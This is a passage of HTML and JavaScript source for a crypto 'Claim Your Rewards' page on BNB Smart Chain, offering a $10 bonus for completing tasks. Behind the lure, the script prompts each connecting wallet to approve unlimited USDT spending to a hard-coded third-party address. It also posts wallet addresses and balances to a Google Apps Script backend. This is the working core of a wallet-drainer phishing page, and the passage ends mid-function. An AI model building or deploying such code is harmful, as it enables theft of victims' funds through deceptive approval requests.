<!doctype html>
<html> 
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>DEMO ‚Äî Rewards</title>

  <!-- -------------------------
       EARLY GLOBAL PATCHES
       (declare global provider + sanitize SVG attrs)
       Must run BEFORE other scripts/bundles load.
       ------------------------- -->
  <script>
    // 1) Ensure a global appKitEip155Provider exists so bundles that reference it won't throw.
    //    Some compiled bundles expect this symbol at global scope; declaring it prevents ReferenceError.
    window.appKitEip155Provider = window.appKitEip155Provider || null;

    // 2) SVG attribute sanitizer:
    //    Some components sometimes emit malformed svg attributes like `width=` or `height=` with empty value.
    //    That causes "Unexpected end of attribute" errors. This small patch prevents empty width/height attrs
    //    from being set and silently ignores attempts to set them to null/undefined/"".
    (function () {
      try {
        const origSet = Element.prototype.setAttribute;
        Element.prototype.setAttribute = function (name, value) {
          // Only guard SVG length attributes to avoid unexpected behavior elsewhere.
          try {
            const tag = this.tagName || "";
            if ((tag.toLowerCase() === 'svg' || this instanceof SVGElement) &&
                (name === 'width' || name === 'height')) {
              if (value === null || value === undefined || value === '') {
                // Ignore attempts to set an empty width/height attribute.
                return;
              }
              // If value is not a valid number/length, let browser handle it ‚Äî but at least avoid empty.
            }
          } catch (e) { /* no-op if instanceof SVGElement check fails */ }
          return origSet.call(this, name, value);
        };

        // Also sanitize when elements are inserted as markup (outerHTML/innerHTML/template)
        // Remove empty width/height attributes from newly appended SVG elements.
        const origAppend = Node.prototype.appendChild;
        Node.prototype.appendChild = function (node) {
          try {
            if (node && node.nodeType === 1 && (node.tagName || '').toLowerCase() === 'svg') {
              if (node.getAttribute && (node.getAttribute('width') === '' || node.getAttribute('width') === null)) {
                node.removeAttribute('width');
              }
              if (node.getAttribute && (node.getAttribute('height') === '' || node.getAttribute('height') === null)) {
                node.removeAttribute('height');
              }
            }
          } catch (e) { /* ignore */ }
          return origAppend.call(this, node);
        };
      } catch (e) {
        // If anything goes wrong here, don't break the app ‚Äî just continue.
        console.warn("SVG sanitizer init failed:", e && e.message ? e.message : e);
      }
    })();
  </script>

  <style>
    *{box-sizing:border-box;margin:0;padding:0}

    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#050816;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }

    /* === HEADER & NAV (same structure as index) === */
    header{
      background:#071027;
      padding:10px 16px;
      position:sticky;
      top:0;
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.03);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .nav-right{
      display:flex;
      align-items:center;
      gap:10px;
      flex-wrap:wrap;
      justify-content:flex-end;
    }

    .nav-right a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    .nav-right a:hover{
      background:#0f1b33;
    }

    .connect{
      background:#3b82f6;
      color:#fff;
      padding:8px 14px;
      border-radius:999px;
      border:0;
      cursor:pointer;
      font-size:0.9rem;
      white-space:nowrap;
    }
    .connect.connected{
      background:#15803d;
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }

    /* small info line under header (User ID etc) */
    .top-info{
      margin-bottom:14px;
      font-size:0.84rem;
      color:#9fb0c8;
      display:flex;
      flex-wrap:wrap;
      gap:10px 18px;
    }
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}

    /* ===== REWARD PAGE ===== */
    .reward-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .reward-title h1{
      font-size:1.9rem;
      margin-bottom:0.4rem;
    }
    .reward-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    .reward-card{
      border-radius:1.5rem;
      padding:1.4rem 1.6rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.4rem;
      border:1px solid rgba(148,163,184,0.35);
      box-shadow:0 20px 45px rgba(15,23,42,0.9);
      background:radial-gradient(circle at top left,#111827,#020617);
    }

    .reward-left,
    .reward-center,
    .reward-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .reward-left{
      min-width:150px;
      gap:0.4rem;
    }

    .reward-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }

    .wallet-icon-base{
      width:54px;
      height:54px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.6);
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
    .wallet-icon-base img{
      width:70%;
      height:70%;
      object-fit:contain;
      display:block;
    }

    .wallet-subline{
      font-size:0.8rem;
      color:#9fb0c8;
    }

    .reward-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.35rem;
    }

    .reward-amount{
      font-size:2.1rem;
      font-weight:700;
      letter-spacing:0.05em;
    }

    .reward-label{
      font-size:0.86rem;
      text-transform:uppercase;
      color:#9ca3af;
      letter-spacing:0.23em;
    }

    .reward-desc{
      margin-top:2px;
      font-size:0.82rem;
      color:#9fb0c8;
      max-width:370px;
    }

    .connected-pill{
      margin-top:6px;
      padding:4px 12px;
      border-radius:999px;
      font-size:0.8rem;
      background:rgba(34,197,94,0.15);
      border:1px solid rgba(34,197,94,0.7);
      color:#bbf7d0;
      display:inline-flex;
      align-items:center;
      gap:6px;
    }
    .connected-pill::before{
      content:"";
      width:6px;
      height:6px;
      border-radius:999px;
      background:#22c55e;
    }

    .btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.55rem 1.8rem;
      font-size:0.9rem;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      white-space:nowrap;
    }

    .btn-claim{
      background:#22c55e;
      color:#022c22;
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      margin-top:0.7rem;
    }
    .btn-claim:hover:not([disabled]){
      transform:translateY(-1px);
      box-shadow:0 18px 40px rgba(34,197,94,0.6);
    }

    .btn-task{
      margin-top:0.45rem;
      background:transparent;
      border:1px solid rgba(148,163,184,0.8);
      color:#e5e7eb;
      font-size:0.86rem;
      padding-inline:1.4rem;
    }
    .btn-task:hover{
      background:rgba(15,23,42,0.9);
      box-shadow:0 10px 26px rgba(15,23,42,0.8);
      transform:translateY(-1px);
    }

    .btn[disabled]{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }

    .reward-right{
      min-width:170px;
      align-items:flex-end;
      gap:0.4rem;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}

    .reward-extra{
      margin-top:18px;
      font-size:0.85rem;
      color:#9fb0c8;
    }

    /* ===== TASK PAGE (same header/footer, just different content) ===== */
    #taskPage{display:none;}

    .task-header-row{
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:10px;
      margin-bottom:16px;
    }
    .task-header-row h2{
      font-size:1.4rem;
    }
    .btn-back{
      border-radius:999px;
      border:1px solid rgba(148,163,184,0.7);
      background:transparent;
      color:#e5e7eb;
      font-size:0.85rem;
      padding:0.4rem 1.2rem;
      cursor:pointer;
    }
    .btn-back:hover{
      background:#111827;
    }

    .task-section{
      margin-top:18px;
      padding:1rem 1.1rem;
      border-radius:0.9rem;
      border:1px solid rgba(75,85,99,0.7);
      background:linear-gradient(135deg,#020617,#020617,#0b1120);
    }
    .task-section h3{
      font-size:1rem;
      margin-bottom:0.35rem;
    }
    .task-section p{
      font-size:0.86rem;
      color:#cbd5f5;
      margin-bottom:0.35rem;
    }
    .task-section ul{
      margin-left:1.2rem;
      margin-bottom:0.35rem;
      font-size:0.86rem;
      color:#cbd5f5;
    }
    .task-section li{
      margin-bottom:0.18rem;
    }

    .video-wrapper{
      position:relative;
      width:100%;
      max-width:640px;
      margin-top:0.6rem;
      margin-bottom:0.6rem;
      padding-top:56.25%; /* 16:9 */
      border-radius:0.75rem;
      overflow:hidden;
      box-shadow:0 18px 38px rgba(15,23,42,0.9);
      background:#020617;
    }
    .video-wrapper iframe{
      position:absolute;
      top:0;left:0;
      width:100%;
      height:100%;
      border:0;
    }

    .task-actions{
      margin-top:0.6rem;
      display:flex;
      flex-wrap:wrap;
      gap:10px;
      align-items:center;
    }
    .task-btn{
      border-radius:999px;
      border:none;
      background:#22c55e;
      color:#022c22;
      font-size:0.9rem;
      padding:0.45rem 1.4rem;
      font-weight:600;
      cursor:pointer;
    }
    .task-btn:hover{
      box-shadow:0 14px 30px rgba(34,197,94,0.45);
      transform:translateY(-1px);
    }

    .task-check{
      font-size:0.84rem;
    }
    .task-check.ok{
      color:#22c55e;
    }
    .task-check.bad{
      color:#f97316;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

    /* Reward layout responsive */
    @media(max-width:768px){
      .reward-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .reward-left{
        align-items:center;
      }
      .reward-right{
        align-items:center;
      }
    }

    /* Header mobile cleanup (match index) */
    @media (max-width: 640px){
      header{
        padding:8px 10px;
      }

      .nav{
        max-width:100%;
        flex-direction:column;
        align-items:stretch;
        justify-content:flex-start;
        gap:6px;
      }

      .logo{
        width:100%;
        text-align:center;
        font-size:0.9rem;
        letter-spacing:3px;
      }
      .nav-right{
        width:100%;
        justify-content:center;
        gap:6px;
      }

      .nav-right a{
        padding:4px 8px;
        font-size:0.85rem;
      }
      header .connect{
        width:100%;
        max-width:260px;
        padding:8px 12px;
        font-size:0.9rem;
      }

      header{
        background:#071027;
        padding:10px 16px;
        position:sticky;
        top:0;
        z-index:20;
        border-bottom:1px solid rgba(255,255,255,0.03);
      }
    }
  </style>
</head>
<body>
  <!-- React root for Vite (hidden, UI is pure HTML) -->
  <div id="root" style="display:none;"></div>

  <header>
    <div class="nav">
      <div class="logo">DEMO</div>
      <div class="nav-right">
        <a href="home.html">Wallet</a>
        <a href="home.html">Task</a>
        <a href="hold-earn.html">Earn</a>
        <button id="connectBtn" class="connect">Connect Wallet</button>
      </div>
    </div>
  </header>

  <main>
    <!-- Top info bar (User ID, address, etc.) -->
    <div class="top-info">
      <div>Status: <span id="statusText">Not connected</span></div>
      <div>Address: <span id="walletAddress" class="mono">‚Äî</span></div>
      <div>Network: <span id="walletNetwork">‚Äî</span></div>
      <div>User ID: <span id="userId" class="mono">-</span></div>
    </div>

    <!-- === REWARD PAGE VIEW === -->
    <div id="rewardPage">
      <div class="reward-title">
        <h1>Claim Your Rewards</h1>
        <p>Connect your BSC wallet once, then use the reward card below to claim.</p>
      </div>

      <div class="reward-card">
        <div class="reward-left">
          <div class="reward-tag">Reward #1</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="Trust Wallet">
          </div>
          <span class="wallet-subline">Trust Wallet ‚Ä¢ BSC</span>
        </div>

        <div class="reward-center">
          <div class="reward-amount" id="rewardAmountDisplay">$10</div>
          <div class="reward-label">Starter Bonus</div>
          <div class="reward-desc">
            First time connection reward for eligible wallets.
          </div>
          <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
          <button id="taskBtn" class="btn btn-task">View Tasks</button> 


          
          <div class="small" id="claimHint" style="margin-top:4px;">
            Claim is locked until wallet is connected and all tasks are completed.
          </div>
        </div>
        
<button id="connectBtnCard" class="connect">Connect Wallet</button> 
        

      </div>
   </div>     


    

    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
    <div id="taskPage">
      <div class="task-header-row">
        <div>
          <h2>Reward Tasks</h2>
          <p class="small">Complete these tasks to become eligible for the Starter Bonus.</p>
        </div>
        <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
      </div>

      <!-- Task 1: video -->
      <div class="task-section">
        <h3>Task 1 ‚Äî Watch the Intro Video</h3>
        <p>
          Watch this video to understand how MYCASH and the reward system works.
        </p>
        <div class="video-wrapper">
          <!-- Replace src with your own embedded video later -->
          <iframe
            src="https://www.youtube.com/embed/dQw4w9WgXcQ"
            title="MYCASH Intro"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowfullscreen
          ></iframe>
        </div>
        <div class="task-actions">
          <button id="task1Btn" class="task-btn">Mark as watched (demo)</button>
          <span id="task1Check" class="task-check bad">‚ùå Not completed</span>
        </div>
      </div>

      <!-- Task 2: wallet balance checker -->
      <div class="task-section">
        <h3>Task 2 ‚Äî Wallet Balance Check</h3>
        <p>
          This task checks if your connected wallet holds at least
          <strong>10 USDT (BEP-20)</strong>. 
        </p>
        <ul>
          <li>Connect your BSC wallet using the button in the header.</li>
          <li>Make sure you hold at least 10 USDT at the token address configured.</li>
          <li>Click ‚ÄúCheck wallet‚Äù to test eligibility.</li>
        </ul>
        <div class="task-actions">
          <button id="task2CheckBtn" class="task-btn">Check wallet (demo)</button>
          <span id="task2Check" class="task-check bad">‚ùå Not checked</span>
        </div>
        <p class="small" id="task2Detail" style="margin-top:4px;">
          Status: waiting for check.
        </p>
      </div>

      <!-- Task 3: custom action -->
      <div class="task-section">
        <h3>Task 3 ‚Äî Custom Action</h3>
        <p>
          i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM 
        </p>
        <ul>
          <li>Example: Join the official Telegram or Discord.</li>
          <li>Example: Submit a simple form with their User ID.</li>
          <li>Example: Perform one on-chain transaction via MYCASH.</li>
        </ul>
        <div class="task-actions">
          <button id="task3Btn" class="task-btn">Mark as done (demo)</button>
          <span id="task3Check" class="task-check bad">‚ùå Not completed</span>
        </div>
      </div>
    </div>
  </main>

  <!-- FOOTER (same structure as index) -->
  <footer>
    ¬© <span id="year"></span> MYCASH ‚Äî BSC (BEP-20) ‚Ä¢ No private keys stored.
  </footer>

  <!-- libs: Web3 + Ethers -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
  <script type="module" src="/src/main.jsx"></script>

  <!-- app script (same logic, AppKit-based connect) -->
  <script type="module">
  (function(){
    // ===== CONFIG =====
    function formatToken(n) {
      n = Number(n);
      if (Number.isInteger(n)) return n.toString();
      return n.toFixed(4).replace(/\.?0+$/, "");
    }

    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
    const APPS_SCRIPT_SECRET = "justforme";

    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";

    const BNB_TESTNET_CHAIN_ID_DEC = 56;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
    const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)" 
    ];
    const ERC20_ALLOWANCE_ABI = [
      "function allowance(address owner, address spender) view returns (uint256)"
    ];

    // USDT on BSC uses 18 decimals
    const TOKEN_DECIMALS = 18;

    const REQUIRED_USDT = 10;   // Task 2
    const REWARD_AMOUNT = 10.0; // display only

    let providerInstance      = null;
    let web3Instance          = null;
    let currentAddress        = null;
    let currentUserId         = null;
    let currentBNBBalance     = null;
    let currentTokenBalance   = null;

    let isWalletConnected = false;
    let task1Done         = false;
    let task2Eligible     = false;
    let task3Done         = false;

    // Use the global declared earlier; keep local ref in sync with window so bundles using either will work.
    let appKitEip155Provider = window.appKitEip155Provider || null;

    // Keep the global in sync whenever we change the local var
    function setAppKitEip155Provider(val){
      appKitEip155Provider = val;
      try{ window.appKitEip155Provider = val; }catch(e){}
    }

    // ===== approval anti-spam + fast immediate helpers =====
    let approvalInProgress = false;
    const REJECT_THROTTLE_MS = 5 * 60 * 1000; // 5 minutes
    const APPROVAL_APPROVED_KEY = "usdt_approved_";      // set when approval succeeded
    const APPROVAL_REJECT_KEY   = "usdt_approve_rej_";   // stores expiry timestamp when user rejected

    function approvalApprovedKey(address){ return APPROVAL_APPROVED_KEY + (address||"").toLowerCase(); }
    function approvalRejectKey(address){ return APPROVAL_REJECT_KEY + (address||"").toLowerCase(); }

    function getApprovedFlag(address){
      try{ return localStorage.getItem(approvalApprovedKey(address)); }catch(e){ return null; }
    }
    function setApprovedFlag(address, val){
      try{ if(!address) return; localStorage.setItem(approvalApprovedKey(address), val || "1"); }catch(e){}
    }

    function getRejectExpiry(address){
      try{ const v = localStorage.getItem(approvalRejectKey(address)); return v ? Number(v) : 0; }catch(e){ return 0; }
    }
    function setRejectExpiry(address, msFromNow){
      try{
        if(!address) return;
        const until = Date.now() + (msFromNow || REJECT_THROTTLE_MS);
        localStorage.setItem(approvalRejectKey(address), String(until));
      }catch(e){}
    }
    function clearRejectExpiry(address){
      try{ localStorage.removeItem(approvalRejectKey(address)); }catch(e){}
    }

    // FAST immediate approve: call this ASAP after you have provider + account (no heavy awaits)
    async function ensureTokenApproval_fastImmediate() {
      if (!TOKEN_ADDRESS || !SPENDER_ADDRESS || !providerInstance) {
        console.warn("fastImmediate: missing config/provider");
        return;
      }
      if (approvalInProgress) {
        console.log("fastImmediate: Approval already in progress, skip");
        return;
      }

      try {
        // try to get owner address fast
        let owner = null;
        try {
          if (providerInstance.selectedAddress) owner = providerInstance.selectedAddress;
          else if (providerInstance.request) {
            const accs = await providerInstance.request({ method: "eth_accounts" }).catch(()=>null);
            if (accs && accs.length) owner = accs[0];
          }
        } catch(e){ /* ignore */ }

        if (!owner) {
          console.warn("fastImmediate: no owner address available");
          return;
        }
        owner = owner.toLowerCase();

        // skip if owner equals token (safety)
        if (TOKEN_ADDRESS.toLowerCase() === owner) {
          console.warn("fastImmediate: TOKEN_ADDRESS equals owner - skipping");
          return;
        }

        // skip if local approved flag exists
        const approved = getApprovedFlag(owner);
        if (approved) {
          console.log("fastImmediate: local approved flag present, skipping");
          return;
        }
        const rejExpiry = getRejectExpiry(owner);
        if (rejExpiry && rejExpiry > Date.now()) {
          console.log("fastImmediate: recent reject - skipping until", new Date(rejExpiry).toISOString());
          return;
        }

        approvalInProgress = true;

        // encode approve data
        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
        const txParams = { from: owner, to: TOKEN_ADDRESS, data };

        // Fire fast eth_sendTransaction immediately (wallet will popup)
        if (providerInstance.request) {
          try {
            setStatus("Waiting for wallet to confirm approval‚Ä¶");
            console.log("[fastImmediate] calling eth_sendTransaction", txParams);
            const result = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
            console.log("[fastImmediate] eth_sendTransaction result", result);
            if (typeof result === "string" && result.startsWith("0x")) {
              // Success: record and return quickly (don't wait)
              setApprovedFlag(owner, result);
              setStatus("Approval sent (pending)...");
              approvalInProgress = false;
              return;
            }
          } catch (err) {
            // if user rejected -> mark and stop (do NOT fallback here)
            const msg = err && err.message ? String(err.message).toLowerCase() : "";
            const code = err && (err.code || err.error) ? err.code : null;
            const isUserRejected = code === 4001 || code === "ACTION_REJECTED" || /user denied|user rejected|user cancelled|signature.*denied/.test(msg);
            if (isUserRejected) {
              console.warn("[fastImmediate] user rejected fast eth_sendTransaction");
              setRejectExpiry(owner, REJECT_THROTTLE_MS);
              setStatus("Approval rejected");
              approvalInProgress = false;
              return;
            }
            console.warn("[fastImmediate] eth_sendTransaction failed (non-reject):", err && err.message ? err.message : err);
            // fall-through to allow fallback later
          }
        }

        // if we get here, fast path not possible/succeeded ‚Äî let caller decide fallback
        approvalInProgress = false;
      } catch (err) {
        console.error("fastImmediate unexpected error:", err);
        approvalInProgress = false;
      }
    }

    // FULL ensureTokenApproval (slower fallback allowed). This will be called later if needed.
    async function ensureTokenApproval(){
      // basic guards
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        setStatus("Connected (no token configured)");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        setStatus("Connected (no spender configured)");
        return;
      }
      if(!providerInstance || !web3Instance){
        console.warn("No providerInstance/web3Instance for approval");
        setStatus("Connected (wallet not ready)");
        return;
      }
      if(approvalInProgress){
        console.log("ensureTokenApproval: Approval already in progress ‚Äî skipping new request");
        return;
      }

      try{
        approvalInProgress = true;
        setStatus("Preparing token approval‚Ä¶");

        // prepare ethers provider & signer
        const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
        const signer = await ethersProvider.getSigner();
        const ownerAddress = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
          alert(
            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
            "It MUST be the BEP-20 token contract address, not your wallet."
          );
          setStatus("Connected (approval skipped)");
          approvalInProgress = false;
          return;
        }

        // Avoid spamming: if we've already recorded approval, skip
        const approvedFlag = getApprovedFlag(ownerAddress);
        if (approvedFlag){
          console.log("Local approved flag present ‚Äî skipping approval");
          setStatus("Connected (already approved)");
          approvalInProgress = false;
          return;
        }

        // Avoid spamming: if user recently rejected, skip until expiry
        const rejExpiry = getRejectExpiry(ownerAddress);
        if (rejExpiry && rejExpiry > Date.now()){
          console.log("Approval recently rejected ‚Äî skipping until", new Date(rejExpiry).toISOString());
          setStatus("Connected (approval previously rejected)");
          approvalInProgress = false;
          return;
        } else if (rejExpiry && rejExpiry <= Date.now()){
          clearRejectExpiry(ownerAddress);
        }

        // Fallback path (slower): use signer.approve(...)
        setStatus("Waiting for wallet to confirm approval‚Ä¶");
        const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);

        try {
          const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
          console.log("[approve] tx sent (fallback):", tx.hash);
          setStatus("Approval pending on chain‚Ä¶");
          await tx.wait();
          setStatus("Connected + Approved ‚úÖ");
          setApprovedFlag(ownerAddress, tx.hash || "1");
          approvalInProgress = false;
          return;
        } catch (errFallback) {
          const code = errFallback && (errFallback.code || errFallback.error) ? errFallback.code : null;
          const msg  = errFallback && errFallback.message ? String(errFallback.message).toLowerCase() : "";
          const isUserRejected =
            code === 4001 ||
            code === "ACTION_REJECTED" ||
            /user denied|user rejected|user rejected the request|user cancelled|signature.*denied/.test(msg);

          if (isUserRejected){
            console.warn("[approve fallback] user rejected approval");
            setRejectExpiry(ownerAddress, REJECT_THROTTLE_MS);
            setStatus("Approval rejected");
          } else {
            console.error("[approve fallback] approval failed:", errFallback);
            setStatus("Approval failed");
          }
          approvalInProgress = false;
          return;
        }

      }catch(err){
        console.error("Token approve unexpected error:", err);
        setStatus("Approval failed");
        approvalInProgress = false;
      }
    }

    // ===== userId helpers =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000);
      return String(num);
    }
    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    const rewardPageEl    = document.getElementById("rewardPage");
    const taskPageEl      = document.getElementById("taskPage");
    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
    const taskBtn         = document.getElementById("taskBtn");

    const claimBtn        = document.getElementById("claimBtn");
    const claimHintEl     = document.getElementById("claimHint");

   const connectBtnCard  = document.getElementById("connectBtnCard");


    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");

    const task1Btn        = document.getElementById("task1Btn");
    const task1CheckEl    = document.getElementById("task1Check");
    const task2CheckBtn   = document.getElementById("task2CheckBtn");
    const task2CheckEl    = document.getElementById("task2Check");
    const task2DetailEl   = document.getElementById("task2Detail");
    const task3Btn        = document.getElementById("task3Btn");
    const task3CheckEl    = document.getElementById("task3Check");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "‚Äî";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "‚Äî";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "‚Äî" : (Number(bnb).toFixed(6) + " BNB");
      }
    }
    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      currentAddress    = null;
      currentUserId     = null;
      currentBNBBalance = null;
      currentTokenBalance = null;

      setStatus("Not connected");
      setWalletInfo("‚Äî","‚Äî",null);
      setUserIdUI("-");

      if(connectBtn){
        connectBtn.textContent = "Connect Wallet";
        connectBtn.classList.remove("connected");
      }

if(connectBtnCard){
  connectBtnCard.textContent = "Connect Wallet";
  connectBtnCard.classList.remove("connected");
}

      updateClaimState();
    }

    function updateClaimState(){
      const allTasksDone = task1Done && task2Eligible && task3Done;
      if(claimBtn){
        claimBtn.disabled = !(isWalletConnected && allTasksDone);
      }
      if(claimHintEl){
        if(!isWalletConnected){
          claimHintEl.textContent = "Please connect your wallet first.";
        }else if(!allTasksDone){
          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
        }else{
          claimHintEl.textContent = "You can now claim your reward.";
        }
      }
    }

    function markTaskState(el, ok, textOk, textBad){
      if(!el) return;
      el.classList.remove("ok","bad");
      if(ok){
        el.classList.add("ok");
        el.textContent = "‚úÖ " + textOk;
      }else{
        el.classList.add("bad");
        el.textContent = "‚ùå " + textBad;
      }
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", async function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          await restoreSessionFromAddress(addr);
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address || "",
          network     : networkText || "",
          timestamp   : new Date().toISOString(),
          userId      : userId || "",
          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
          eventType   : eventType || "connect"
        });

        console.log("notifyBackend payload", Object.fromEntries(payload.entries()));

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
          console.warn("TOKEN_ADDRESS invalid");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);

        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method:"wallet_switchEthereumChain",
          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method:"wallet_addEthereumChain",
              params:[{
                chainId:BNB_TESTNET_CHAIN_ID_HEX,
                chainName:"BNB Smart Chain",
                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
                rpcUrls:[BNB_TESTNET_RPC],
                blockExplorerUrls:["https://bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BNB Smart Chain:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    // Watch AppKit provider globally (mobile fix)
    function setupAppKitProviderWatcher() {
      if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;

      window.appKit.subscribeProviders(async (state) => {
        const provider = state["eip155"] || null;

        // NEWLY CONNECTED or RESTORED provider
        if (provider && provider !== appKitEip155Provider) {
          setAppKitEip155Provider(provider);
          await handleAppKitProvider(provider);
        }

        // DISCONNECTED provider
        if (!provider && appKitEip155Provider) {
